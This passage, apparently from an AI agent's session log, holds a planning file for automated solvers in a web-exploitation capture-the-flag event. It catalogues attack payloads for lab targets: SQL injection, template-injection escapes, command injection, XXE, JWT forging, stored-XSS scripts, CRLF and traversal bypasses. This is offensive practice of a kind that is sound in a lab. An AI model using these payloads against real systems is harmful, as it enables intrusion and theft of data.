9000 from error hints. Parser: proof regex in the proxied body, base64/JSON-wrapped content fields. Fixture: D15 error bodies (absolute_url_required, internal_only, fetch_failed) + a mocked blocked_host.\"},\n175\t  {\"id\": \"deserialization-gadgets\", \"concept\": \"native / signed serialization sequels: pickle, PHP, Java, node-serialize, .NET (row 21b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Lowered after cal. 27 (new concepts outrank sequels since D19; JWT stays priority 1). D20 saw the data-tamper form (unsigned base64url JSON `state` described by a format guide; role -> administrator). Sequel planner: recognise base64 blobs gASV/gAN (pickle), Tzo/YTo (PHP serialize, length-prefixed strings -> fix s:N when editing), rO0 (Java), AAEAAAD (.NET BinaryFormatter), `_$$ND_FUNC$$_` (node-serialize), YAML `!!python`; first rewrite data fields (role/isAdmin/user) keeping the format's own length/type markers, then a minimal gadget that only reads /run/huntress/objective.txt (pickle __reduce__ -> open().read() returned into a field the app echoes). Encodings per guide (base64url/base64/hex/raw). Parser: proof regex / evidence.\"},\n176\t  {\"id\": \"ssti-sandbox-escape\", \"concept\": \"SSTI sequels: filtered/sandboxed engine, file read, stored template (row 11b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D11 rendered `{{objective}}` directly (context var) under a Spring Boot costume; `{{T(java.lang.Runtime)}}` printed a class, ${..}/*{..} stayed literal. A sequel may hide `objective` or filter `{{`. Planner: fingerprint by arithmetic family ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, {{7*'7'}} -> 7777777 Jinja2 / 49 Twig), then per-engine reads of the prompt path: Jinja2 cycler.__init__.__globals__.os.popen / lipsum / request.application, Twig source() / _self.env, SpEL T(java.nio.file.Files).readString(T(java.nio.file.Path).of('/run/huntress/objective.txt')), Freemarker ?new() / ?api, ERB File.read, EJS/Nunjucks/Handlebars constructor chains, Thymeleaf __${..}__::. Filter bypasses: attr()/|join, hex/unicode, request.args indirection. Also plant in stored fields read later (row 37). Parser: proof regex in rendered body.\"},\n177\t  {\"id\": \"stored-second-order-generic\", \"concept\": \"plant now, read on another route: second-order for any class (row 37)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D12 pattern generalised: feature_route = POST sink (`post_required`, `saved:true`), secondary_route = later reader. Planner takes a per-class payload list (SQLi ladder, SSTI `{{objective}}`/`${..}`, cmd `;cat <prompt path>`, XSS for a bot) and plants each as JSON (then form) in every common field (name,q,query,note,label,title,value,filter,search,term,report,display_name,bio,comment,message) in one body, re-GETs every reader route after EACH plant. Parser: proof regex only (D12 prints `effect` even when rows are empty).\"},\n178\t  {\"id\": \"sqli-union-blind\", \"concept\": \"UNION / error / boolean-blind SQLi (row 28)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D03 tautology and D12 second-order are seen. Remaining: ORDER BY / NULL-count columns, UNION SELECT with table names from errors or sqlite_master / information_schema, marker-based string column, boolean-blind with a length/row-count oracle (bounded alphabet [0-9a-f_proof], 32 chars), time-based (sleep/randomblob) only when nothing differs, login bypass admin'--. Payloads delivered as JSON body AND query/form (D12 bound JSON only). SQLite/MySQL/Postgres dialects. Title puns to expect: \\\"yes or no\\\", \\\"takes its time\\\", \\\"union\\\".\"},\n179\t  {\"id\": \"type-juggling-auth\", \"concept\": \"loose comparison / JSON type confusion in auth or token checks (row 34)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"PHP/Laravel or Node costume with a token/PIN/password compare. JSON bodies with true, 0, \\\"0\\\", [], {}, null, \\\"0e1\\\" magic hashes, arrays where strings are expected (strcmp(array) == 0), numeric strings with whitespace. Field names from the form/clues. Parser: effect+evidence / proof.\"},\n180\t  {\"id\": \"session-id-weakness\", \"concept\": \"session hijack: predictable / leaked / non-rotated session ids (row 32)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D08 sequel. Collect every session-like value the app reveals (Set-Cookie, clue hints, URLs, /api/history, logs pages, Referer leaks); detect structure (sequential int, timestamp, md5(user), base64 JSON); plan reuse of a leaked victim id as arena_session/sid cookie and a logout-then-reuse check. Never guess beyond values the app derives from data it shows.\"},\n181\t  {\"id\": \"vcs-debug-leak-reader\", \"concept\": \"exposed .git / .env / DEBUG pages (row 22)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Probe /.git/HEAD, /.git/config, /.env, /.DS_Store, /debug, /actuator/env, /phpinfo.php within the capped recon list. Parser: .git loose objects (zlib) -> commit -> tree -> blob, .DS_Store names, Django DEBUG 404 URL list, .env secrets -> jwt-session-forge.\"},\n182\t  {\"id\": \"lfi-filter-bypass\", \"concept\": \"traversal filters / suffix / prefix rules (row 29)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Planner from D04's set: nested strip (....//, ..././), URL / double / overlong encodings, backslash, required prefix (pages/../../..), appended suffix (%00, ?, #, php://filter), absolute, file://, /proc/self/cwd and /proc/self/root. Cheapest first; decode base64 filter output.\"},\n183\t  {\"id\": \"upload-filter-bypass\", \"concept\": \"upload sequels: enforced type filter, served-path traversal, stored SVG/HTML (row 20b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D10's policy (txt, text/plain) was never enforced. Sequel planner over the same upload_shape (JSON filename/content/content_type, or multipart if the form says so): double extension (n.txt.html, n.html.txt), case (N.HTML), trailing dot/space, content_type spoof vs extension, GIF89a/PNG magic prefix, filename traversal (../n.html, ..%2fn.html) to land in a served dir named by the clues, SVG with script or XXE, template syntax in the content per the guide. Parser: read the returned path/url, GET it, proof regex.\"},\n184\t  {\"id\": \"headless-browser\", \"concept\": \"client-side JS execution for DOM XSS / CSRF checks (rows 13c, 24a)\", \"priority\": 2, \"action\": \"tool\", \"detail\": \"D06-D07 needed none (server-judged headers; GM-side bot). Install only if a day demands local JS execution: `uv pip install --python .venv/bin/python playwright && .venv/bin/playwright install chromium` (or system chromium --headless --dump-dom).\"},\n185\t  {\"id\": \"bopla-field-read\", \"concept\": \"excessive data exposure / hidden-field read on API routes (row 36)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D14 showed the property-level read side through an explicit `fields`+`action` pair on an inventory-listed route (seen, handler exists). Remaining sibling: routes WITHOUT an inventory where hidden keys come back through ?fields=*, ?include=all, ?expand=*, ?view=admin|full|debug, ?debug=1, Accept: application/vnd.api+json, or list endpoints returning keys the HTML omits (secret, proof, note, internal). Compare key sets against the page. Parser: proof regex after JSON flattening.\"},\n186\t  {\"id\": \"api-resource-limit-overread\", \"concept\": \"unrestricted resource consumption / pagination over-read (row 40, OWASP API4)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"List routes with limit/page_size/per_page/offset/page: plan limit=1000|100000|-1|0, page=0|-1, offset beyond the public window, size=all, and batch/array ids (id=1,2,3 / ids[]=). Look for records past the public set carrying proof/secret. No flooding: <= 10 requests.\"},\n187\t  {\"id\": \"cmd-injection-sequels\", \"concept\": \"command injection sequels: filtered separators, blind, argument injection (row 10b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D16 was the plain form (`ls -ld <path>` with stdout echoed; `;` worked once percent-encoded). Sequel planner, input = param name (input_parameter / `<x>_required`) + example value: separators %3B, %0a, %26%26, %7C, $(..), backticks, ${IFS} for spaces, quotes-split (c''at), wildcard paths (/run/hunt*/obj*); argument injection when the value is an argument not a shell string (`--output=/app/static/x`, `-exec cat {} ;` for find, `--help`-style); blind: copy the proof into a served static dir (the example path, e.g. /app/static) then GET it. Parser: proof regex in stdout/body or in the copied file.\"},\n188\t  {\"id\": \"graphql-batch-alias-mutation\", \"concept\": \"GraphQL sequels: aliases, batched arrays, mutations without authz, introspection off (row 23b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D18 was the plain form (introspection on, one resolver skipped the field check). Sequel planner from the schema: alias the protected field across every arg-taking Query field (a1:case(id:..){..} a2:...), JSON array batching [{query},{query}], mutations (updateX/setRole/assign) reachable without authz followed by the read, node(id:)/Relay global ids (base64 'Type:id'), fragments on interfaces/unions to reach hidden types; introspection disabled -> field-suggestion walk ('Did you mean') and common names (note, secret, proof, evidence, internal). Transports: POST JSON, GET ?query=, form, application/graphql body. Parser: proof regex over data and errors[].message.\"},\n189\t  {\"id\": \"crlf-header-injection\", \"concept\": \"CRLF / response-header injection (row 42)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Params reflected into Location / Set-Cookie / custom headers (redirect targets, language, filename in Content-Disposition): %0d%0aSet-Cookie:%20role=admin, %0d%0aX-Debug:1, double CRLF to inject a body; also %E5%98%8A%E5%98%8D unicode CRLF. Then re-request the secondary route with the injected cookie. Parser: injected header in the raw response + proof regex.\"},\n190\t  {\"id\": \"crypto-weak-token-derivation\", \"concept\": \"crypto failures: tokens derivable from data the app shows (row 45, OWASP A02)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"OWASP A02 is the largest untouched Top-10 area. Planner over every token/id the app issues to US (reset tokens like D17's 12 hex, session ids, invite codes, receipt ids): test whether it equals md5/sha1/sha256 of (username|account_id|email|timestamp|id), truncated, hex/base64; sequential/time-based ids; then derive the victim's token from the victim's id/label shown in a guide. ECB-style cookies: repeated 16-byte blocks -> cut-and-paste a role block; CBC bit-flip on a known plaintext field. Only derivations from values the app shows; no brute force.\"},\n191\t  {\"id\": \"known-vulnerable-component\", \"concept\": \"version disclosure -> a documented weakness of that exact component (row 46, OWASP A06)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"Untouched Top-10 area. Recon parser: version strings in headers (Server, X-Powered-By), /version, /health, /actuator/info, footer, package.json/composer.lock/requirements exposed via backups; map to a small local table of training-kit-style weaknesses (debug console routes, default admin route, deprecated param that skips the check) and emit only requests against the documented route/param. No exploit downloads, no scanning; proof regex.\"},\n192\t  {\"id\": \"sse-socketio-transport\", \"concept\": \"other real-time transports: SSE, socket.io/engine.io, JSON-RPC, per-message WS authz (row 41b)\", \"priority\": 2, \"action\": \"prebuild\", \"detail\": \"D22 was the plain WS form (Origin present + ?stream=<stream_reference> -> first frame has the proof). Sequel planner reusing lib/web/handlers/day27_web_socket_to_me.py's stdlib client: SSE (GET with Accept: text/event-stream, parse `data:` lines, stream id as ?stream=/?channel=/Last-Event-ID), socket.io v4 (GET /socket.io/?EIO=4&transport=polling -> sid, then 40 / 42[\\\"subscribe\\\",ref] over polling or WS upgrade), per-message authz (open own stream, send {\\\"subscribe\\\"|\\\"join\\\"|\\\"stream\\\": protected ref}), Origin variants (own, foreign, null) when the handshake is origin-checked. Parser: proof regex over every frame/event.\"},\n193\t  {\"id\": \"http-param-pollution\", \"concept\": \"duplicate params / keys split between proxy and app (row 35)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"For a route whose check and action read the same param: a=safe&a=evil, a[]=..., JSON duplicate keys (first vs last wins), mixed query + body copies, ; separators. Order the planner by which copy the error names. Parser: proof regex.\"},\n194\t  {\"id\": \"ldap-xpath-injection\", \"concept\": \"LDAP / XPath injection (row 43)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"Login or directory search over LDAP/XML: `*`, `*)(uid=*))(|(uid=*`, `admin)(&)`; XPath `' or '1'='1`, `'] | //* | //*['`, count()/string-length() oracles bounded to the proof alphabet. Parser: proof regex.\"},\n195\t  {\"id\": \"log-injection-forging\", \"concept\": \"log injection / forged audit entries (row 47, OWASP A09)\", \"priority\": 3, \"action\": \"prebuild\", \"detail\": \"An audit/log route (secondary_route audit-<hex6> recurred D13/D17) that records user input and is later trusted by an approver/bot: plant `%0a` / `\\\\r\\\\n` forged lines ('[admin] approved <id>'), JSON-log key injection (\\\"\\\\\\\",\\\\\\\"role\\\\\\\":\\\\\\\"admin\\\"), or XSS for a bot-viewed log page; then GET the audit/secondary route. Parser: proof regex / evidence.\"}\n196\t]\n197\t```\n198\t"}]},"parent_tool_use_id":null,"session_id":"8e4fb739-e3b4-441f-9ea8-cd85c9144370","uuid":"74f435b9-f2c8-49d3-b321-b47a1151910c","timestamp":"2026-10-28T13:08:43.117Z","tool_use_result":{"type":"text","file":{"filePath":"/home/testpwn/.claude/projects/-home-testpwn-huntress-2026/8e4fb739-e3b4-441f-9ea8-cd85c9144370/tool-results/bdfmgal8g.txt","content":"  GET /api/clues   -> feature_route / secondary_route / current_role|current_user + ZERO or ONE concept key\n  GET each clue route BARE: the JSON error names the missing piece (post_required(405) = POST sink,\n      administrator_required, path_required, account_id_required, loopback_only, 426 websocket_upgrade_required;\n      404 not_found on a GraphQL route = POST JSON). A *_guide_route / inventory_route JSON lists the next requests.\n  GET /, /robots.txt, /openapi.json, /sitemap.xml -> links, forms, inline fetch('/api/..'), comments, Disallow\n  regex  proof_[0-9a-f]{32}  over EVERY body/frame. An `effect` without the proof is NOT a solve (D12, D16).\n  Any file read (LFI, cmd, SSTI, XXE, file://): /run/huntress/config.json `weakness` names the class.\nPick routes by clue KEY, NEVER by the word in the value (process|execute|inspect|submit|result|audit re-dealt).\nNo concept key (D11-D13, D15, D21) -> the prompt's verb names the bug; POST bodies: JSON first (D12 ignored form).\nQuery values: always --data-urlencode / %3B (Go drops a raw `;`). MASTERY: 5 targets, prompt = today's only ->\n  earlier-day handlers use their own defaults (D04 reads /run/huntress/objective.txt with no path in the prompt).\nONE-SHOT STATE (credits/balance/remaining in a secondary, \"race\", \"twice\") -> GET only until the burst (D21).\n\nCLUE KEY / PROMPT CUE                                  -> BUG                -> FIRST REQUEST\nrobots Disallow, \"backup\" | \"Signed in as\" + ids       -> backup | IDOR      -> Disallow -> index -> .bak (depth 2) | foreign id from /api/history\nsearch box, \"database\" | feature_route only, \"a sign\"  -> SQLi | open route  -> q=zz') OR 1=1 -- (+ quote-balanced ' \" )) #) | GET it\n?doc= (handbook.php/notes.php), \"stay inside\"          -> traversal          -> ../ x10 + /run/huntress/objective.txt\ncallback_nonce, \"repeats everything\"                   -> reflected XSS      -> ?q=<script>fetch('/cb?nonce=N')</script>, then GET /cb?nonce=N\n      with Sec-Fetch-Site: same-origin, Mode: cors, Dest: empty, Referer: <reflected URL>, Origin, X-Callback-Nonce\nmoderator_data_route + receipt_route_template          -> stored XSS (bot)   -> POST /api/<noun> {\"message\":\"<script>fetch(DATA,{credentials:\n  \"guestbook\", \"reviewer stops by\"                          'include'}) -> POST RCPT {evidence}</script>\"}; poll /<noun>/{id} >=30 s\nsession_hint, \"plant your session\"                     -> session fixation   -> feature?sid=<hint>, then secondary with arena_session=<hint>\npreferences_route, hidden csrf_token, \"even strangers\" -> CSRF (D09)         -> external option, Sec-Fetch-Site: cross-site, Mode: navigate,\n                                                                                Dest: document, foreign Referer; GET /api/preferences\nupload_shape/render_route, \"standards. Low ones\"       -> upload (D10)       -> POST JSON {filename:\"n.html\",content:\"<p>{{objective}}</p>\"} -> GET path\n\"evaluates everything\", empty \"Rendered message\" <pre> -> SSTI (D11)         -> ?template=a${7*7}b{{7*7}}c per param -> {{objective}}\n\"plant ... come back later\", post_required + rows:[]   -> 2nd-order SQLi     -> POST JSON {every field: \"x' OR '1'='1' -- \"}, GET secondary\n\"binds whatever you hand it\", administrator_required   -> mass assignment    -> POST JSON {display_name, role:\"admin\", is_admin, isAdmin, roles,..}\ninventory_route + protected_reference                  -> field/action authz -> feature?id=<protected>&fields=<f>&action=<a>, EVERY single f x a\nabsolute_url_required + secondary internal_only        -> SSRF (D15)         -> feature?url=http://127.0.0.1:8080<secondary>; ladder :80 :5000 ..\ninput_parameter + example_path, 400 path_required      -> cmd injection(D16) -> feature?<param>=<example>%3Bcat%20/run/huntress/objective.txt\nrecovery_guide_route, self_service_only                -> reset token (D17)  -> token for the self_service id, redeem it with the other account_id\nprotected_reference + note, GET 404 not_found          -> GraphQL (D18)      -> POST {\"query\":\"{__schema{..}}\"}; case(id:\"<prot>\"){id title note}\nevent_type + owner_scope (values), webhook_rejected    -> forged webhook(D19)-> POST JSON {event_type,type,event: <ev>, owner_scope,scope,owner: <scope>,\n                                                                                role,current_role:\"admin\", source,sender:\"provider\", verified,signed,trusted:true}\nstate_format_route, \"sign nothing\", state_required     -> unsigned state(D20)-> GET guide; POST {<field>: b64url(sample, role=\"administrator\")} to `transport`\n\"One credit, two purchases ... race it\", secondary 403 -> race (D21)         -> NO sequential POST; 24 concurrent POST {} to feature on a barrier,\n  credit_not_overspent + credits, 409 credit_unavailable                        then GET secondary (UNSOLVED: success shape unknown)\nstream_reference, 426 websocket_upgrade_required,      -> WS stream (D22)    -> WS handshake to feature?stream=<ref> WITH Origin: <target> (none = 403);\n  \"upgraded to websockets ... never meant for you\"                              proof in the first server text frame (stdlib socket+ssl client)\ndeployment: trusted_reverse_proxy, 403 loopback_only   -> proxy header (D23) -> GET feature with X-Forwarded-For: 127.0.0.1 (then X-Real-IP, Forwarded:\n  + evaluated_client, \"whatever the proxy whispers\"                             for=, X-Client-IP, True-Client-IP); evaluated_client must flip\ncurrent_role / role cookie / X-*-Role                  -> role tampering     -> set the named value to administrator/admin (cookie, header, claim)\neyJ..eyJ..sig in cookie/Authorization, blob + .sig     -> JWT / signed state -> alg none / leaked secret / re-sign; then the role ladder\notp/verify/step 2, \"second factor\" | ?next=/redirect_uri -> MFA skip | redirect -> final step with the step-1 session | point it at the clue route\nlocation.hash/search -> innerHTML/eval in inline JS    -> DOM XSS            -> payload in #fragment; bot or callback check\nHost/X-Forwarded-Host in links, \"cache\" | 403 on route -> Host poison | path -> X-Forwarded-Host/X-Original-URL; /ROUTE, //route, /route;/, method override\nSSRF filtered (blocked_host) -> 2130706433, 127.1, [::1], allowed@127.0.0.1, file:///run/...; ACAO echoes Origin -> CORS\n/api/v1 vs /v2, \"legacy\"; EventSource/socket.io        -> shadow API / SSE   -> the protected op on every version / transport (same authz?)\nXML/SVG/DOCX upload -> XXE <!ENTITY x SYSTEM \"file:///run/huntress/objective.txt\">. \"__proto__\"/JSON merge -> {\"__proto__\":{\"isAdmin\":true}}\nGeneric rejection naming no field (webhook_rejected) -> ONE alias-union JSON body first (D19). Real bot only on \"reviewer visits\" (D07).\nNEW CLASS = write lib/web/handlers/dayNN_*.py (KEY_MAP + HANDLERS) BEFORE the single submit (D11, D19, D20, D23 -> TT\nfirst try; D09-D10, D12-D13, D15-D18, D22 TT solver_incomplete). Banners are costume; the title pun names the bug.\n```\n\n## Readiness gaps\n\nPriority 1 = plausible within ~3 calendar days (D24-D29 at ~2 lane-days per day). \"prebuild\" = pure python handler\n(request planner + response parser, no I/O; the solver fetches) with offline fixtures = recorded bodies incl. a\ndecoy. \"note\" = harness/prompt change. \"tool\" = install. None built yet (web prebuild lane exists but is opt-in; no\n`web:*` keys in .run/prebuild-state.json). Dropped after D23 (cal. 27): `websocket-authz` (seen D22 -> `sse-socketio-transport`), `header-trust-verb-path-bypass`\n(header half seen D23 -> `path-verb-normalization-bypass`), `logic-race-reset` (race seen D21, unsolved ->\n`race-burst-first-dispatch` note + `business-logic-tamper`). Added: `mastery-prompt-free-defaults`. Raised to 1:\n`cache-host-header`, `cors-misconfig-probe`, `codify-before-tt` (regressed on D22). Lowered to 2: webhook / SSRF /\ndeserialization sequels (new concepts beat sequels since D19). Dropped after D13: `ssti-engine-probe`, `port-day22-handlers`. After D15:\n`ssrf-planner`. After D18: `cmd-injection-planner`, `graphql-introspection`. After D20: `api-unsafe-consumption`\n(seen D19 -> `webhook-signature-sequels`); `deserialization-gadgets` narrowed to native/signed formats (unsigned JSON\nstate seen D20); `codify-before-tt` lowered to 2 (fixed on D19-D20). Added after D20: `webhook-signature-sequels`,\n`alias-union-body-builder`, `crypto-weak-token-derivation`, `known-vulnerable-component`, `log-injection-forging`;\nraised: `jwt-session-forge` (first), `role-tamper-planner` detail (role ladder).\n\n```json\n[\n  {\"id\": \"enable-web-prebuild-lane\", \"concept\": \"harness: the web prebuild lane exists but is opt-in (HCTF_PREBUILD_WEB=1)\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Partly done on D25: hctf/prebuild.py LANES now has `web` (brief prebuild_web, writable lib/web/handlers/prebuilt/ + tests/data/web_fixtures/, targets tests/data/web_fixtures/TARGETS.json, offline gate tests/test_web_fixtures.py, requires lib/web/handlers/__init__.py:_load_plugins + lib/web/handlers/prebuilt/__init__.py) but it is OPT-IN: AUTO_LANES only appends web when HCTF_PREBUILD_WEB=1 (or HCTF_PREBUILD_LANES lists it). After D20 lib/web/handlers/prebuilt/ still holds only __init__.py and .run/prebuild-state.json has no web:* keys -> nothing below has drained. Owner of the nightly batch: set HCTF_PREBUILD_WEB=1 (or add web to the default AUTO_LANES) so the prebuild gaps below get built; fixtures = saved target responses (targets 410 after CORRECT).\"},\n  {\"id\": \"race-burst-first-dispatch\", \"concept\": \"one-shot race targets must get the concurrent burst before ANY sequential POST (row 26)\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D21 Double Spent single was never solved: at the workers' first GET the secondary already said credit_not_overspent credits:0 and every POST -> 409 credit_unavailable (sequential, 8x curl, 10x HTTP/2, 24x barrier). The race_bisect / prior-solver dry run ran 16 s on the fresh target (13:00:43-13:00:59) and its default ladder + D12/D13/D19 handlers POST to feature_route, which spends the one credit. Owner of lib/web + hctf: (1) promote challenges/day27/web-double-spent/solver/day27_web_double_spent.plugin_draft.py (GET gate on the secondary, barrier-synced ~24 POST {} burst, GET secondary) as lib/web/handlers/day27_web_double_spent.py; (2) in lib/web candidates(), when any GET body says credit_not_overspent / credits / balance / remaining, run ONLY the race handler first; (3) race_bisect / dry runs must be GET-only on web targets (or skip web). Matters for every future Mastery that deals a D21 target. Record the success effect spelling when it lands.\"},\n  {\"id\": \"mastery-prompt-free-defaults\", \"concept\": \"earlier-day web solvers must not derive parameters from the Mastery prompt\", \"priority\": 1, \"action\": \"note\", \"detail\": \"Cal. 27: both Mastery runs (D22, D23) went 4/5 -- proof-4 was a D04 Stay in Your Directory target (PHP+Apache, no /api/clues, `handbook.php?doc=triage.php` | `notes.php?doc=..`, proof in <article>). challenges/day20/web-stay-in-your-directory/solver/solve.py lfi() takes its read path from the prompt text (regex for /run|/etc|..) and otherwise uses /flag.txt; the Mastery prompt is today's, so it never tried /run/huntress/objective.txt. Fix: always include /run/huntress/objective.txt (and /run/huntress/config.json for classification) in the path list. Audit the other earlier-day solvers for the same prompt dependence.\"},\n  {\"id\": \"codify-before-tt\", \"concept\": \"harness: the class handler must exist before Time Trial starts\", \"priority\": 1, \"action\": \"note\", \"detail\": \"REGRESSED on cal. 27: D22 Socket to Me's handler landed 21:02:33, 20 s after the TT solve began (21:01:59-21:02:13) -> TT solver_incomplete (live worker CORRECT ~40 s after ready). D23's handler landed before TT -> 10.5 s first try. FIXED on D19-D20 (cal. 26): the answer-first worker promoted the plugin during the single (45 s grace at CORRECT, commit 4715290f) -> both Time Trials (10.2 s, 15.1 s) and both Mastery runs (4/4, 13-16 s) first try, the first new-class TTs to pass since D14. Before that TT went solver_incomplete on D09, D10, D12, D13, D15-D18 (plugins landed 0-2 s after TT start; D16 Mastery 3/4 with the plugin still `.tmp`). Keep: if a single needs >~90 s, gate TT start on the promoted plugin being importable.\"},\n  {\"id\": \"runtime-config-oracle\", \"concept\": \"/run/huntress/config.json names the weakness once any file read works\", \"priority\": 1, \"action\": \"note\", \"detail\": \"D16's `cat /run/huntress/*` printed config.json {schema: huntress.web_exploitation.runtime_config.v1, profile_id: framework_<lang>_<fw>_<weakness>, framework_cell, weakness: os_command_injection, mode: single|time_trial|mastery, layout...} next to objective.txt. Owner of lib/web: after any handler achieves a file read (LFI D04, cmd D16, SSTI file read, XXE, SSRF file://), also read /run/huntress/config.json and log `weakness`/`profile_id` -- a free classifier for unknown Mastery targets and for the codify worker's KEY_MAP. Never submit anything from it; the proof is still objective.txt.\"},\n  {\"id\": \"jwt-session-forge\", \"concept\": \"JWT alg:none / leaked-secret HS256 / Flask-itsdangerous / Express s: cookies (rows 7, 8)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Still unseen after D23 -- the biggest remaining session/integrity class. D20 'Serialized Offender' was the UNSIGNED form (`{state: b64url(JSON)}`, 'sign nothing'); the signed-but-weak sequel is the most likely next session/integrity day. Pure python (hmac, hashlib, base64, json, zlib): decode JWT; produce alg none ('none'/'None'/'NONE', empty sig, dropped sig segment), HS256 re-signed with secrets FOUND in recon (clues, *_guide/format routes, backups, .env, JS, comments, `kid` pointing at a readable file), RS256->HS256 with a published public key (jwks.json / *.pem route), jku/x5u to an app-owned route. Flask session: base64url(zlib?) payload.timestamp.sig with itsdangerous derive (salt 'cookie-session', HMAC-SHA1); Express `s:<val>.<sig>` (HMAC-SHA256 base64 no padding); generic `<b64 JSON>.<hex hmac>` blobs. Escalate with the D20 role ladder (administrator, admin, superuser, root, owner) on every `*role*`/`is_admin` claim, keep other claims. Reuse D20's format-guide reading (transport, request_field, encoding). No secret brute force beyond what the app leaks.\"},\n  {\"id\": \"cache-host-header\", \"concept\": \"web cache poisoning / Host-header attacks (row 30)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Raised after D23 (proxy-trust day): the same 'trusted proxy' kit with another header family is the natural sequel -- X-Forwarded-Host / X-Host / X-Forwarded-Proto / X-Original-URL / X-Rewrite-URL one at a time against the feature route, and Host-poisoned reset/callback links. Reuse D23's error shape: a JSON error that echoes what the app evaluated (`evaluated_client`) tells which header bound. Unkeyed headers (X-Forwarded-Host, X-Host, X-Forwarded-Scheme, X-Original-URL) reflected into cached responses (Age/X-Cache/CF-Cache-Status) or password-reset links; plan: poison with the clue callback route, then fetch as the victim/bot path. Cloudflare sits in front, so key on app-level cache headers only.\"},\n  {\"id\": \"cors-misconfig-probe\", \"concept\": \"CORS reflected Origin with credentials (row 24c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Raised after D22: the WS handshake was gated only on an Origin header being PRESENT (own or foreign accepted) -- the origin-trust family is live in this kit. Request the clue data routes with Origin: https://evil.example, null, <base>.evil.example, sub.<base>; flag ACAO echoing + ACAC true. Exploit via the victim bot: stored/bot-visited script fetch(DATA,{credentials:'include'}) from a cross-origin page and POST to the app's receipt route; or the app may judge it server-side by the Origin header (effect JSON).\"},\n  {\"id\": \"path-verb-normalization-bypass\", \"concept\": \"HTTP verb / method override and path-normalisation authz bypass (rows 16, 17)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D23 took the header half of the old 'header-trust-verb-path-bypass' gap (seen). The other two classic 403-bypass families remain and fit a 'protected path' kit (D23's prompt: 'stroll down the protected path'). Pure planner for a route that 401/403/405s: methods HEAD/POST/PUT/PATCH/OPTIONS/TRACE + X-HTTP-Method-Override / X-Method-Override / _method=; path variants /ROUTE upper-case, trailing /, /., //route, /./route, /route;/, /route..;/, %2e/%2f/%61 single-char encodings, trailing ?/#, X-Original-URL / X-Rewrite-URL with a harmless base path. Parser: proof regex; diff status/body against the baseline 403 and stop at the first 200 with evidence.\"},\n  {\"id\": \"business-logic-tamper\", \"concept\": \"business-logic sequels: negative/huge amounts, price in the body, coupon replay, step reorder (row 26b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D21 showed a ledger kit (feature POST spends credits, secondary audits the balance). Sibling flaws a sequel day would use: quantity/amount -1, 0, 1e9, 0.0001, strings ('1e3'), a client-sent price/total field, a redeem/coupon token replayed or applied twice sequentially, a checkout/approval step called out of order. Planner input = guide/clue JSON + one observed request body; output = <= 12 single-change JSON bodies, GET secondary after each. GET-only recon first (one-shot state, see race-burst-first-dispatch). Parser: proof regex.\"},\n  {\"id\": \"mfa-step-skip-auth-flow\", \"concept\": \"auth-flow sequels: MFA/OTP step skip, Host-header reset link, leaked/reused codes, login state machine (row 27b)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D17 (reset token not bound to account) was the first authentication-flow day (OWASP API2). Planner over a guide/clue JSON or form chain: identify steps (login -> otp/verify -> session; request -> email/preview -> redeem); try calling the final step with the step-1 state (cookie/token) and no code, an empty/null/array code, the code issued to OUR account on another account_id/username, a code echoed in any response, a step-2 response flag (`mfa_required:false`, `verified:true`) set in the JSON body; reset links built from X-Forwarded-Host / Host to a route we can read. Parameter names from the guide (`account_parameter`, `token_parameter`, `code`, `otp`). Parser: proof regex / evidence. No brute force of codes.\"},\n  {\"id\": \"alias-union-body-builder\", \"concept\": \"one JSON body carrying every clue value under every plausible alias + privilege/trust flags\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"D19 lost ~60 s across three workers bisecting ~30 narrow bodies against a sink whose only error was webhook_rejected; the answer-first worker's kitchen-sink body landed first try in single/TT/Mastery. Pure builder: input = clue JSON (minus route keys) + optional guide sample; output = ordered list of JSON bodies: (1) union body: each value under its key and aliases (event_type/type/event/kind/action/topic/name; owner_scope/scope/owner/tenant; user/username/account/account_id; id/case_id/reference) + role/current_role/user_role 'admin' and 'administrator' variants + source/sender/provider/origin 'provider' + verified/signed/trusted/authenticated true; (2) nested variants {event:{..}}, {data:{..}}, {payload:{..}}; (3) per-field bisect list only after a hit. Never arrays at top level (D19 500). Reusable for any POST sink with a generic error (D12/D13/D19 shapes).\"},\n  {\"id\": \"xxe-payloads\", \"concept\": \"XML external entities (row 18)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"XML endpoints/uploads: in-band entity on the prompt path, parameter-entity variant, php://filter base64, XInclude, SVG / DOCX (zipfile) container builder carrying the entity. Parser: proof regex, base64 decode. D10 proved an upload kit with `upload_shape: POST JSON filename/content/content_type`; an XML/SVG sibling is the obvious sequel -> also try content_type application/xml / image/svg+xml through the same upload route and the preview path.\"},\n  {\"id\": \"dom-xss-sink-scan\", \"concept\": \"DOM XSS: client-side source -> sink (row 13c)\", \"priority\": 1, \"action\": \"prebuild\", \"detail\": \"Third XSS flavour after D06 reflected / D07 stored. Static scan of inline and linked JS for sources (location.hash/search/href, document.referrer, postMessage data, localStorage) flowing into sinks (innerHTML, outerHTML, 